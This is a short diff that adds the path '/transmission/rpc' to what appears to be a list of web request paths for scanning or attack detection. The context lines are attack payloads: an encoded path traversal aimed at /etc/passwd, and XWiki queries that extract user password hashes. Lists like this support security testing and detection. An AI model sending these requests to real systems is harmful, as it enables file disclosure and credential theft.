@@ -2342,3 +2342,4 @@
 /bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
 /xwiki/bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
 /bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
+/transmission/rpc
